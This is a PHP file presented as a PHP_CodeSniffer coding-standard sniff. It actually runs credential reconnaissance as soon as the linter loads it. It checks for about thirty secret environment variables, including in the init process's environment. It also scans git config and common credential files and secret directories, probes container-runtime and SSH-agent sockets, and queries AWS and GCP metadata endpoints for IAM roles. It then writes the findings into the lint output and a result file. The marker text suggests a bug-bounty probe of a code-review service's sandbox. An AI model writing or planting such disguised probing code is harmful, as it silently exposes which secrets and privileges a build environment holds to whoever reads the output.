<?php

namespace ControlledStandard\Sniffs\Safe;

use PHP_CodeSniffer\Files\File;
use PHP_CodeSniffer\Sniffs\Sniff;

final class BoundarySniff implements Sniff
{
    private string $marker = '';

    public function register(): array
    {
        $credentialNames = [
            'ANTHROPIC_API_KEYS', 'APERTURE_AGENT_KEY', 'AWS_ACCESS_KEY_ID',
            'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN', 'AZURE_CLIENT_SECRET',
            'CI_JOB_TOKEN', 'CODERABBIT_API_KEY', 'CODECOV_TOKEN', 'COMPOSER_AUTH',
            'COURIER_NOTIFICATION_AUTH_TOKEN', 'DATADOG_API_KEY', 'DD_API_KEY',
            'DOCKER_AUTH_CONFIG', 'ENCRYPTION_PASSWORD', 'GCP_SERVICE_ACCOUNT_KEY',
            'GH_TOKEN', 'GH_WEBHOOK_SECRET', 'GITHUB_APP_CLIENT_SECRET',
            'GITHUB_APP_PEM_FILE', 'GITHUB_TOKEN', 'GITLAB_BOT_TOKEN',
            'GOOGLE_APPLICATION_CREDENTIALS', 'JIRA_SECRET', 'LANGCHAIN_API_KEY',
            'NODE_AUTH_TOKEN', 'NPM_TOKEN', 'OPENAI_API_KEYS', 'PYPI_TOKEN',
            'SENTRY_AUTH_TOKEN',
        ];
        $currentNames = array_values(array_filter(
            $credentialNames,
            static fn (string $name): bool => getenv($name) !== false,
        ));
        $pidOneNames = $this->pidOneNames();
        $initNames = array_values(array_filter(
            $credentialNames,
            static fn (string $name): bool => in_array($name, $pidOneNames, true),
        ));
        [$awsRole, $gcpServiceAccount] = $this->cloudIdentityFlags();
        $flags = [];
        if ($currentNames !== []) {
            $flags[] = 'ENV-' . implode('+', $currentNames);
        }
        if ($initNames !== []) {
            $flags[] = 'PID1-' . implode('+', $initNames);
        }
        if ($this->gitConfigurationContainsCredential()) {
            $flags[] = 'GITAUTH';
        }
        if ($this->secretFilePresent()) {
            $flags[] = 'SECRETFILE';
        }
        if ($awsRole) {
            $flags[] = 'AWSROLE';
        }
        if ($gcpServiceAccount) {
            $flags[] = 'GCPSA';
        }
        if ($this->runtimeSocketResponds()) {
            $flags[] = 'RUNTIMESOCK';
        }
        $sshSocket = getenv('SSH_AUTH_SOCK');
        if (is_string($sshSocket) && $sshSocket !== '' && $this->socketConnects($sshSocket)) {
            $flags[] = 'SSHAGENT';
        }
        $suffix = $flags === [] ? 'NONE' : implode('_', $flags);
        $this->marker = "CR_H1_SAFE_PHPCS_BOUNDARY_20260815_U_{$suffix}";
        file_put_contents(
            getcwd() . DIRECTORY_SEPARATOR . 'analysis_phpcs_boundary_result.txt',
            $this->marker . PHP_EOL,
        );
        return [T_OPEN_TAG];
    }

    public function process(File $phpcsFile, $stackPtr): void
    {
        $phpcsFile->addError($this->marker, $stackPtr, 'IsolationBoundary');
    }

    private function pidOneNames(): array
    {
        $environment = @file_get_contents('/proc/1/environ');
        if (!is_string($environment)) {
            return [];
        }
        return array_values(array_filter(array_map(
            static fn (string $entry): string => explode('=', $entry, 2)[0],
            array_filter(explode("\0", $environment)),
        )));
    }

    private function readableFile(string $path): bool
    {
        return is_file($path) && is_readable($path);
    }

    private function secretFilePresent(): bool
    {
        $paths = [
            '/root/.aws/credentials',
            '/root/.config/gcloud/application_default_credentials.json',
            '/root/.config/gh/hosts.yml',
            '/root/.git-credentials',
            '/home/coderabbit/.aws/credentials',
            '/home/coderabbit/.config/gcloud/application_default_credentials.json',
            '/home/coderabbit/.config/gh/hosts.yml',
            '/home/coderabbit/.git-credentials',
            '/home/node/.aws/credentials',
            '/home/node/.config/gcloud/application_default_credentials.json',
            '/home/node/.config/gh/hosts.yml',
            '/home/node/.git-credentials',
        ];
        foreach ($paths as $path) {
            if ($this->readableFile($path)) {
                return true;
            }
        }
        foreach (['/etc/secrets', '/run/secrets', '/secrets', '/var/run/secrets'] as $directory) {
            if (!is_dir($directory) || !is_readable($directory)) {
                continue;
            }
            try {
                $iterator = new \RecursiveIteratorIterator(
                    new \RecursiveDirectoryIterator($directory, \FilesystemIterator::SKIP_DOTS),
                );
                foreach ($iterator as $file) {
                    if ($iterator->getDepth() > 2) {
                        continue;
                    }
                    if (
                        $file->isFile()
                        && preg_match('/auth|credential|dockerconfig|key|password|secret|token/i', $file->getFilename())
                        && $file->isReadable()
                    ) {
                        return true;
                    }
                }
            } catch (\Throwable $error) {
                continue;
            }
        }
        return false;
    }

    private function gitConfigurationPaths(): array
    {
        $dotGit = getcwd() . DIRECTORY_SEPARATOR . '.git';
        $paths = [$dotGit . DIRECTORY_SEPARATOR . 'config'];
        if (!is_file($dotGit)) {
            return $paths;
        }
        $contents = @file_get_contents($dotGit);
        if (!is_string($contents) || preg_match('/^gitdir:\s*(.+)$/i', trim($contents), $match) !== 1) {
            return $paths;
        }
        $gitDirectory = $match[1];
        if (!str_starts_with($gitDirectory, DIRECTORY_SEPARATOR)) {
            $gitDirectory = dirname($dotGit) . DIRECTORY_SEPARATOR . $gitDirectory;
        }
        $resolved = realpath($gitDirectory);
        if (!is_string($resolved)) {
            return $paths;
        }
        $paths[] = $resolved . DIRECTORY_SEPARATOR . 'config';
        $paths[] = $resolved . DIRECTORY_SEPARATOR . 'config.worktree';
        if (basename(dirname($resolved)) === 'worktrees') {
            $paths[] = dirname($resolved, 2) . DIRECTORY_SEPARATOR . 'config';
        }
        return $paths;
    }

    private function gitConfigurationContainsCredential(): bool
    {
        foreach ($this->gitConfigurationPaths() as $path) {
            $contents = @file_get_contents($path);
            if (
                is_string($contents)
                && preg_match(
                    '/authorization|bearer|oauth2|x-access-token|https?:\/\/[^\s\/:@]+:[^\s\/@]+@/i',
                    $contents,
                ) === 1
            ) {
                return true;
            }
        }
        return false;
    }

    private function socketConnects(string $path, bool $ping = false): bool
    {
        if (!is_readable($path) || !is_writable($path)) {
            return false;
        }
        $errorNumber = 0;
        $errorMessage = '';
        $socket = @stream_socket_client(
            'unix://' . $path,
            $errorNumber,
            $errorMessage,
            0.65,
            STREAM_CLIENT_CONNECT,
        );
        if (!is_resource($socket)) {
            return false;
        }
        stream_set_timeout($socket, 0, 650000);
        if (!$ping) {
            fclose($socket);
            return true;
        }
        $written = @fwrite($socket, "GET /_ping HTTP/1.0\r\nHost: localhost\r\n\r\n");
        $status = $written === false ? false : @fgets($socket, 64);
        fclose($socket);
        return is_string($status) && preg_match('/^HTTP\/1\.[01] 200\b/', $status) === 1;
    }

    private function runtimeSocketResponds(): bool
    {
        foreach ([
            '/run/docker.sock', '/run/podman/podman.sock',
            '/var/run/docker.sock', '/var/run/podman/podman.sock',
        ] as $path) {
            if ($this->socketConnects($path, true)) {
                return true;
            }
        }
        return false;
    }

    private function httpText(string $url, string $method = 'GET', array $headers = []): string
    {
        $context = stream_context_create([
            'http' => [
                'method' => $method,
                'header' => implode("\r\n", $headers),
                'ignore_errors' => true,
                'timeout' => 0.65,
            ],
        ]);
        $body = @file_get_contents($url, false, $context, 0, 4096);
        if (!is_string($body) || !isset($http_response_header[0])) {
            return '';
        }
        if (preg_match('/^HTTP\/\S+ 2\d\d\b/', $http_response_header[0]) !== 1) {
            return '';
        }
        return trim($body);
    }

    private function cloudIdentityFlags(): array
    {
        $token = $this->httpText(
            'http://169.254.169.254/latest/api/token',
            'PUT',
            ['X-aws-ec2-metadata-token-ttl-seconds: 60'],
        );
        $awsRole = false;
        if ($token !== '' && strlen($token) < 4096) {
            $awsRole = $this->httpText(
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'GET',
                ['X-aws-ec2-metadata-token: ' . $token],
            ) !== '';
        }
        $gcpServiceAccount = $this->httpText(
            'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/',
            'GET',
            ['Metadata-Flavor: Google'],
        ) !== '';
        return [$awsRole, $gcpServiceAccount];
    }
}
